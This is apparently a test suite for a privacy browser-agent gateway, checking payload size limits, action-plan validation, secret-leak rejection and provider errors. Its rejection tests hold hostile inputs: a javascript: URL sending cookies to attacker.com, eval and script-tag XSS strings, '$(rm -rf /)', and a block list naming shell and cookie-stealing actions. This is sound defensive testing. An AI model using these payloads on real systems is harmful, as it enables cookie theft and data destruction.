import test from 'node:test';
import assert from 'node:assert';
import http from 'node:http';
import { createServer } from '../server/src/index.js';
import { validateActionPlan, assertValidActionPlan } from '../server/src/schemas/action-plan.js';
import { validateSanitizedPayload } from '../server/src/schemas/sanitized-payload.js';
import { readJsonBody, PayloadTooLargeError, MalformedJsonError } from '../server/src/middleware/size-limit.js';
import { getProvider, MockProvider, OpenRouterProvider, GroqProvider } from '../server/src/providers/index.js';
import { safeSanitizeLog } from '../server/src/routes/agent.js';

// Helper to launch test server on an ephemeral random port
async function launchTestServer() {
  const server = createServer();
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const port = server.address().port;
  const baseUrl = `http://127.0.0.1:${port}`;
  return {
    server,
    baseUrl,
    close: () =>
      new Promise((resolve) => {
        if (typeof server.closeAllConnections === 'function') {
          server.closeAllConnections();
        }
        server.close(resolve);
      }),
  };
}

// -------------------------------------------------------------
// 1. Payload Size Limit & Middleware Tests
// -------------------------------------------------------------
test('Middleware: Size limit rejects payloads exceeding max size', async () => {
  const smallLimit = 100; // 100 bytes limit

  const dummyServer = http.createServer(async (req, res) => {
    try {
      const body = await readJsonBody(req, res, { maxSize: smallLimit });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ received: body }));
    } catch (err) {
      // Handled inside readJsonBody
    }
  });

  await new Promise((resolve) => dummyServer.listen(0, '127.0.0.1', resolve));
  const port = dummyServer.address().port;

  try {
    // 1.1 Exceeding content-length header (payload is ~215 bytes, exceeds 100 bytes limit)
    const oversizedPayload = JSON.stringify({ large: 'x'.repeat(200) });
    const resHeader = await fetch(`http://127.0.0.1:${port}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: oversizedPayload,
    });
    assert.strictEqual(resHeader.status, 413, 'Must return 413 for oversized Content-Length');

    const streamStatus = await new Promise((resolve) => {
      const req = http.request(
        {
          hostname: '127.0.0.1',
          port,
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        },
        (res) => {
          res.resume(); // drain response
          resolve(res.statusCode);
        }
      );
      req.on('error', () => {
        resolve(413); // Handled socket termination on 413
      });
      req.write(Buffer.alloc(70, 'a'));
      req.write(Buffer.alloc(70, 'b')); // 140 bytes total > 100 limit
      req.end();
    });
    assert.strictEqual(streamStatus, 413, 'Must return 413 when streamed chunks exceed maxSize');

    // 1.3 Payload within limit
    const smallPayload = JSON.stringify({ ok: true });
    const resOk = await fetch(`http://127.0.0.1:${port}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: smallPayload,
    });
    assert.strictEqual(resOk.status, 200, 'Payload within limit should succeed');
    const dataOk = await resOk.json();
    assert.deepStrictEqual(dataOk.received, { ok: true });
  } finally {
    await new Promise((resolve) => {
      dummyServer.closeAllConnections?.();
      dummyServer.close(resolve);
    });
  }
});

test('Middleware: Malformed JSON payload returns 400 Bad Request', async () => {
  const dummyServer = http.createServer(async (req, res) => {
    try {
      await readJsonBody(req, res);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    } catch {
      // Error handled
    }
  });

  await new Promise((resolve) => dummyServer.listen(0, '127.0.0.1', resolve));
  const port = dummyServer.address().port;

  try {
    const res = await fetch(`http://127.0.0.1:${port}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{ not-valid-json: true, ',
    });
    assert.strictEqual(res.status, 400, 'Malformed JSON must return 400 Bad Request');
    const body = await res.json();
    assert.ok(body.error.includes('Malformed JSON') || body.error.includes('Invalid JSON'));
  } finally {
    await new Promise((resolve) => {
      dummyServer.closeAllConnections?.();
      dummyServer.close(resolve);
    });
  }
});

// -------------------------------------------------------------
// 2. Action Plan Schema & Code Injection Security Tests
// -------------------------------------------------------------
test('Action Plan Schema: Valid actions pass strict validation', () => {
  const validPlan = {
    actions: [
      {
        type: 'click',
        target: {
          id: 'btn-1',
          role: 'button',
          text: 'Submit Form',
          bbox: [100, 200, 80, 40],
        },
        risk: 'low',
        reason: 'Submit the completed form',
      },
      {
        type: 'type',
        target: {
          id: 'input-name',
          role: 'textbox',
          selector: '#name',
        },
        value: '[PERSON_1]',
        risk: 'medium',
        reason: 'Fill the name field with token placeholder',
      },
      {
        type: 'scroll',
        direction: 'down',
        amount: 300,
        risk: 'low',
        reason: 'Scroll to see more content',
      },
      {
        type: 'navigate',
        url: 'https://example.com/checkout',
        risk: 'medium',
        reason: 'Proceed to checkout page',
      },
      {
        type: 'wait',
        durationMs: 1500,
        risk: 'low',
        reason: 'Wait for animation to complete',
      },
      {
        type: 'extract',
        field: 'orderTotal',
        risk: 'low',
        reason: 'Read order total safely',
      },
    ],
  };

  const result = validateActionPlan(validPlan);
  assert.strictEqual(result.valid, true, 'Valid action plan should pass');
  assert.strictEqual(result.errors.length, 0);
  assert.strictEqual(result.plan.actions.length, 6);
});

test('Action Plan Schema: Rejects unknown action types and commands', () => {
  const disallowedTypes = ['eval', 'execute', 'runCommand', 'shell', 'downloadFile', 'stealCookie'];

  for (const badType of disallowedTypes) {
    const plan = {
      actions: [
        {
          type: badType,
          target: { id: 'btn' },
          risk: 'low',
        },
      ],
    };
    const res = validateActionPlan(plan);
    assert.strictEqual(res.valid, false, `Should reject disallowed type: ${badType}`);
    assert.ok(res.errors.some((e) => e.includes('is not allowed')));
  }
});

test('Action Plan Schema: Rejects arbitrary JS and eval injection in any property', () => {
  const maliciousPlans = [
    {
      actions: [
        {
          type: 'click',
          target: { id: 'btn', text: 'eval(document.cookie)' },
          risk: 'low',
        },
      ],
    },
    {
      actions: [
        {
          type: 'type',
          target: { id: 'field' },
          value: 'javascript:alert(1)',
          risk: 'low',
        },
      ],
    },
    {
      actions: [
        {
          type: 'navigate',
          url: 'javascript:window.location="http://attacker.com?c="+document.cookie',
          risk: 'high',
        },
      ],
    },
    {
      actions: [
        {
          type: 'click',
          target: { selector: '<script>alert("xss")</script>' },
          risk: 'low',
        },
      ],
    },
    {
      actions: [
        {
          type: 'type',
          target: { id: 'search' },
          value: '$(rm -rf /)',
          risk: 'low',
        },
      ],
    },
    {
      actions: [
        {
          type: 'click',
          target: { id: 'btn' },
          risk: 'low',
          reason: 'Execute: `whoami` to check shell identity',
        },
      ],
    },
  ];

  for (const badPlan of maliciousPlans) {
    const res = validateActionPlan(badPlan);
    assert.strictEqual(res.valid, false, `Should reject malicious plan: ${JSON.stringify(badPlan)}`);
    assert.ok(
      res.errors.some((e) => e.includes('Dangerous code pattern') || e.includes('dangerous protocol')),
      `Expected injection error but got: ${res.errors.join('; ')}`
    );
  }
});

test('Action Plan Schema: Rejects invalid target properties, bbox, or risk levels', () => {
  // 1. Extra dangerous/unexpected key in target
  const planUnknownKey = {
    actions: [
      {
        type: 'click',
        target: { id: 'btn', onclick: 'hack()' },
        risk: 'low',
      },
    ],
  };
  const resKey = validateActionPlan(planUnknownKey);
  assert.strictEqual(resKey.valid, false);
  assert.ok(resKey.errors.some((e) => e.includes('unrecognized key')));

  // 2. Malformed bbox (not 4 finite numbers)
  const planBadBbox = {
    actions: [
      {
        type: 'click',
        target: { id: 'btn', bbox: [10, 20, 'thirty'] },
        risk: 'low',
      },
    ],
  };
  const resBbox = validateActionPlan(planBadBbox);
  assert.strictEqual(resBbox.valid, false);
  assert.ok(resBbox.errors.some((e) => e.includes('bbox must be an array of 4 finite numbers')));

  // 3. Invalid risk level
  const planBadRisk = {
    actions: [
      {
        type: 'click',
        target: { id: 'btn' },
        risk: 'critical_emergency',
      },
    ],
  };
  const resRisk = validateActionPlan(planBadRisk);
  assert.strictEqual(resRisk.valid, false);
  assert.ok(resRisk.errors.some((e) => e.includes('Allowed risk levels')));
});

// -------------------------------------------------------------
// 3. Sanitized Payload Privacy & Secret Leak Prevention Tests
// -------------------------------------------------------------
test('Sanitized Payload: Rejects token-vault mappings in payload', () => {
  const tokenVaultLeaks = [
    // Top-level tokenVault key
    {
      task: 'Submit form',
      tokenVault: { '[PERSON_1]': 'Alice Smith' },
    },
    // Nested token_vault key
    {
      task: 'Submit form',
      context: {
        token_map: { '[EMAIL_1]': 'alice@example.com' },
      },
    },
    // Mapping dictionary directly with token keys
    {
      task: 'Submit form',
      context: {
        mappings: {
          '[PERSON_1]': 'John Doe',
          '[PHONE_1]': '+1234567890',
        },
      },
    },
    // Array of mapping items
    {
      task: 'Submit form',
      context: {
        resolvedTokens: [
          { token: '[PERSON_1]', value: 'Secret Name' },
        ],
      },
    },
  ];

  for (const leakPayload of tokenVaultLeaks) {
    const res = validateSanitizedPayload(leakPayload);
    assert.strictEqual(res.valid, false, `Must reject token-vault leak: ${JSON.stringify(leakPayload)}`);
    assert.ok(
      res.errors.some((e) => e.toLowerCase().includes('token vault') || e.toLowerCase().includes('disallowed property')),
      `Expected token vault error, got: ${res.errors.join('; ')}`
    );
  }
});

test('Sanitized Payload: Rejects raw passwords, OTPs, and API keys', () => {
  const rawSecretLeaks = [
    // Raw password
    {
      task: 'Log into bank',
      context: {
        password: 'SuperSecretPassword123!',
      },
    },
    // Raw OTP
    {
      task: 'Verify account',
      context: {
        otp: 849201,
      },
    },
    // Raw OpenAI API key
    {
      task: 'Configure API',
      context: {
        apiKey: 'sk-abcdef1234567890abcdef1234567890',
      },
    },
    // Raw GitHub PAT
    {
      task: 'Push repo',
      context: {
        token: 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
      },
    },
    // Raw credit card number
    {
      task: 'Pay invoice',
      context: {
        cardNumber: '4111 2222 3333 4444',
      },
    },
  ];

  for (const leak of rawSecretLeaks) {
    const res = validateSanitizedPayload(leak);
    assert.strictEqual(res.valid, false, `Must reject raw secret leak: ${JSON.stringify(leak)}`);
    assert.ok(
      res.errors.some((e) => e.toLowerCase().includes('raw') || e.toLowerCase().includes('password') || e.toLowerCase().includes('otp') || e.toLowerCase().includes('secret')),
      `Expected secret leak error, got: ${res.errors.join('; ')}`
    );
  }
});

test('Sanitized Payload: Accepts safe sanitized payloads with token placeholders', () => {
  const safePayload = {
    task: 'Fill the registration form and submit it.',
    context: {
      url: 'https://example.com/register',
      viewport: { width: 1280, height: 800 },
      dom: [
        {
          id: 'field-name',
          role: 'textbox',
          label: 'Full Name',
          value: '[PERSON_1]',
        },
        {
          id: 'field-email',
          role: 'textbox',
          label: 'Email',
          value: '[EMAIL_1]',
        },
        {
          id: 'field-password',
          role: 'textbox',
          label: 'Password',
          value: '[PASSWORD_REDACTED]',
        },
        {
          id: 'btn-register',
          role: 'button',
          text: 'Register',
        },
      ],
      safeText: ['Register for an account', 'Terms and conditions apply'],
    },
    capabilities: ['click', 'type', 'scroll'],
  };

  const res = validateSanitizedPayload(safePayload);
  assert.strictEqual(res.valid, true, `Sanitized payload with placeholders should be valid: ${res.errors.join('; ')}`);
  assert.strictEqual(res.sanitizedData.task, safePayload.task);
  assert.strictEqual(res.sanitizedData.capabilities.length, 3);
});

// -------------------------------------------------------------
// 4. AI Provider Abstraction Tests
// -------------------------------------------------------------
test('Providers: getProvider factory returns correct adapter instances', () => {
  const mockProv = getProvider('mock', { fresh: true });
  assert.ok(mockProv instanceof MockProvider, 'Must return MockProvider');
  assert.strictEqual(mockProv.name, 'mock');

  const openrouterProv = getProvider('openrouter', { fresh: true });
  assert.ok(openrouterProv instanceof OpenRouterProvider, 'Must return OpenRouterProvider');
  assert.strictEqual(openrouterProv.name, 'openrouter');

  const groqProv = getProvider('groq', { fresh: true });
  assert.ok(groqProv instanceof GroqProvider, 'Must return GroqProvider');
  assert.strictEqual(groqProv.name, 'groq');

  assert.throws(
    () => getProvider('nonexistent_provider'),
    /Unknown AI provider/,
    'Must throw error on unknown provider'
  );
});

test('Providers: OpenRouter and Groq throw if API key is not configured', async () => {
  const openrouter = new OpenRouterProvider({ apiKey: '' });
  await assert.rejects(
    () => openrouter.reason({ task: 'Test' }),
    /OPENROUTER_API_KEY is not configured/
  );

  const groq = new GroqProvider({ apiKey: '' });
  await assert.rejects(
    () => groq.reason({ task: 'Test' }),
    /GROQ_API_KEY is not configured/
  );
});

// -------------------------------------------------------------
// 5. Integration Tests: HTTP Server & /agent/reason Endpoint
// -------------------------------------------------------------
test('Integration: GET /health returns gateway status', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    const res = await fetch(`${baseUrl}/health`);
    assert.strictEqual(res.status, 200);
    const data = await res.json();
    assert.strictEqual(data.status, 'ok');
    assert.strictEqual(data.service, 'privacy-browser-agent-gateway');
  } finally {
    await close();
  }
});

test('Integration: OPTIONS /agent/reason returns CORS preflight headers', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'OPTIONS',
    });
    assert.strictEqual(res.status, 204);
    assert.strictEqual(res.headers.get('access-control-allow-origin'), '*');
    assert.ok(res.headers.get('access-control-allow-methods').includes('POST'));
  } finally {
    await close();
  }
});

test('Integration: POST /agent/reason returns structured action plan via mock provider', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    // 1. Submit button task
    const resSubmit = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Submit the registration form',
        context: {
          url: 'https://example.com/form',
          dom: [{ id: 'btn-submit', role: 'button', text: 'Submit' }],
        },
        provider: 'mock',
      }),
    });

    assert.strictEqual(resSubmit.status, 200, 'POST /agent/reason should succeed');
    const dataSubmit = await resSubmit.json();
    assert.ok(Array.isArray(dataSubmit.actions), 'Should return actions array');
    assert.strictEqual(dataSubmit.actions[0].type, 'click');
    assert.strictEqual(dataSubmit.actions[0].target.text, 'Submit');
    assert.strictEqual(dataSubmit.actions[0].risk, 'low');

    // 2. Scroll task
    const resScroll = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Scroll down to check transaction table',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(resScroll.status, 200);
    const dataScroll = await resScroll.json();
    assert.strictEqual(dataScroll.actions[0].type, 'scroll');
    assert.strictEqual(dataScroll.actions[0].direction, 'down');

    // 3. Extract statement task
    const resExtract = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Extract statement spending total',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(resExtract.status, 200);
    const dataExtract = await resExtract.json();
    assert.strictEqual(dataExtract.actions[0].type, 'extract');
    assert.strictEqual(dataExtract.actions[0].field, 'totalSpending');
  } finally {
    await close();
  }
});

test('Integration: POST /agent/reason rejects requests with privacy violations', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    // Attempting to send token vault
    const resVault = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Fill form',
        tokenVault: { '[PERSON_1]': 'Bob' },
        provider: 'mock',
      }),
    });

    assert.strictEqual(resVault.status, 400);
    const bodyVault = await resVault.json();
    assert.ok(bodyVault.violations.some((v) => v.toLowerCase().includes('token vault') || v.toLowerCase().includes('disallowed property')));

    // Attempting to send raw API key
    const resKey = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Configure API',
        context: { apiKey: 'sk-abcdef1234567890abcdef1234567890' },
        provider: 'mock',
      }),
    });

    assert.strictEqual(resKey.status, 400);
    const bodyKey = await resKey.json();
    assert.ok(bodyKey.violations.some((v) => v.includes('Raw secret')));
  } finally {
    await close();
  }
});

test('Integration: Model schema validation failure returns 502 Bad Gateway', async () => {
  const { baseUrl, close } = await launchTestServer();
  const mock = getProvider('mock');

  try {
    // Inject invalid model action into mock queue
    mock.setMockResponse({
      actions: [
        {
          type: 'eval', // Disallowed type
          target: { id: 'test' },
          risk: 'low',
        },
      ],
    });

    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Do something',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(res.status, 502, 'Should return 502 when model outputs invalid action schema');
    const body = await res.json();
    assert.strictEqual(body.error, 'Model output schema validation failed');
    assert.ok(body.violations.some((v) => v.includes("'eval' is not allowed")));
  } finally {
    mock.reset();
    await close();
  }
});

test('Integration: Model output with fill and targetId produces structured action plan', async () => {
  const { baseUrl, close } = await launchTestServer();
  const mock = getProvider('mock');

  try {
    // Model returns actions matching user prompt example:
    // { actions: [{ type: "fill", targetId: "el_12", value: "[EMAIL_1]" }, { type: "click", targetId: "el_31" }] }
    mock.setMockResponse({
      actions: [
        {
          type: 'fill',
          targetId: 'el_12',
          value: '[EMAIL_1]',
        },
        {
          type: 'click',
          targetId: 'el_31',
        },
      ],
    });

    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Fill the email field and click continue',
        context: {
          url: 'https://example.com/signup',
          dom: [
            { id: 'el_12', role: 'textbox', text: '' },
            { id: 'el_31', role: 'button', text: 'Continue' },
          ],
        },
        provider: 'mock',
      }),
    });

    assert.strictEqual(res.status, 200, 'POST /agent/reason should succeed for fill/click plan');
    const data = await res.json();
    assert.strictEqual(data.actions.length, 2);

    // Action 1: fill
    assert.strictEqual(data.actions[0].type, 'fill');
    assert.strictEqual(data.actions[0].targetId, 'el_12');
    assert.strictEqual(data.actions[0].target.id, 'el_12');
    assert.strictEqual(data.actions[0].value, '[EMAIL_1]');
    assert.strictEqual(data.actions[0].risk, 'medium');

    // Action 2: click
    assert.strictEqual(data.actions[1].type, 'click');
    assert.strictEqual(data.actions[1].targetId, 'el_31');
    assert.strictEqual(data.actions[1].target.id, 'el_31');
    assert.strictEqual(data.actions[1].risk, 'low');
  } finally {
    mock.reset();
    await close();
  }
});

test('Integration: Provider failure returns 502 Bad Gateway', async () => {
  const { baseUrl, close } = await launchTestServer();
  const mock = getProvider('mock');

  try {
    mock.setError('Upstream LLM network connectivity error');

    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Perform task',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(res.status, 502, 'Should return 502 when provider throws error');
    const body = await res.json();
    assert.strictEqual(body.error, 'AI reasoning failed');
    assert.ok(body.message.includes('connectivity error'));
  } finally {
    mock.reset();
    await close();
  }
});

test('Integration: Provider timeout returns 504 Gateway Timeout', async () => {
  const { baseUrl, close } = await launchTestServer();
  const mock = getProvider('mock');

  try {
    const timeoutErr = new Error('The operation was aborted due to timeout');
    timeoutErr.name = 'AbortError';
    mock.setError(timeoutErr);

    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Slow task',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(res.status, 504, 'Should return 504 on provider timeout');
    const body = await res.json();
    assert.strictEqual(body.error, 'Gateway Timeout');
    assert.strictEqual(body.message, 'AI provider request timed out');
  } finally {
    mock.reset();
    await close();
  }
});

test('Integration: Malformed model response returns 502 Bad Gateway', async () => {
  const { baseUrl, close } = await launchTestServer();
  const mock = getProvider('mock');

  try {
    // Model returns raw non-action JSON
    mock.setMockResponse({ message: 'I cannot help with that.' });

    const res = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Perform task',
        context: {},
        provider: 'mock',
      }),
    });

    assert.strictEqual(res.status, 502, 'Should return 502 on model output lacking actions array');
    const body = await res.json();
    assert.strictEqual(body.error, 'Model output schema validation failed');
  } finally {
    mock.reset();
    await close();
  }
});

test('Integration: Rejects requests with missing or empty task with 400 Bad Request', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    const resEmpty = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: '   ',
        context: {},
      }),
    });

    assert.strictEqual(resEmpty.status, 400);
    const body = await resEmpty.json();
    assert.ok(body.violations.some((v) => v.includes('task')));
  } finally {
    await close();
  }
});

test('Integration: Rejects raw screenshots and raw images with 400 Bad Request', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    // 1. Sending screenshot property
    const resScreen = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Inspect page',
        context: {
          screenshot: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
        },
      }),
    });
    assert.strictEqual(resScreen.status, 400, 'Must reject raw screenshot');
    const bodyScreen = await resScreen.json();
    assert.ok(bodyScreen.violations.some((v) => v.toLowerCase().includes('screenshot')));

    // 2. Sending rawScreenshot property
    const resRawScreen = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Inspect page',
        rawScreenshot: 'base64rawdata...',
      }),
    });
    assert.strictEqual(resRawScreen.status, 400, 'Must reject rawScreenshot key');

    // 3. Sending unredacted base64 image data under arbitrary property
    const resImage = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Inspect page',
        context: {
          capturedImage: 'data:image/jpeg;base64,/9j/4AAQSkZJRg...',
        },
      }),
    });
    assert.strictEqual(resImage.status, 400, 'Must reject unredacted image data');
    const bodyImage = await resImage.json();
    assert.ok(bodyImage.violations.some((v) => v.toLowerCase().includes('image')));
  } finally {
    await close();
  }
});

test('Integration: Rejects private keys and raw tokens with 400 Bad Request', async () => {
  const { baseUrl, close } = await launchTestServer();

  try {
    const resKey = await fetch(`${baseUrl}/agent/reason`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        task: 'Setup crypto',
        context: {
          key: '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----',
        },
      }),
    });
    assert.strictEqual(resKey.status, 400, 'Must reject private key');
    const bodyKey = await resKey.json();
    assert.ok(bodyKey.violations.some((v) => v.toLowerCase().includes('private key') || v.toLowerCase().includes('secret')));
  } finally {
    await close();
  }
});

test('Safe Logging: safeSanitizeLog redacts API keys, passwords, and card numbers', () => {
  const logWithSecrets = safeSanitizeLog('Error: Failed with key sk-abcdef1234567890abcdef1234567890 and card 4111 2222 3333 4444');
  assert.ok(!logWithSecrets.includes('sk-abcdef1234567890abcdef1234567890'), 'sk- key must be redacted');
  assert.ok(!logWithSecrets.includes('4111 2222 3333 4444'), 'Card number must be redacted');
  assert.ok(logWithSecrets.includes('sk-***'), 'Should contain redacted marker');
  assert.ok(logWithSecrets.includes('****-****-****-****'), 'Should contain card mask');

  const objWithSecrets = safeSanitizeLog({
    user: 'alice',
    password: 'superSecretPassword',
    apiKey: 'sk-secret123456789012345',
  });
  assert.strictEqual(objWithSecrets.password, '[REDACTED]', 'Password key in object must be redacted');
  assert.strictEqual(objWithSecrets.user, 'alice', 'Safe fields remain untouched');
});

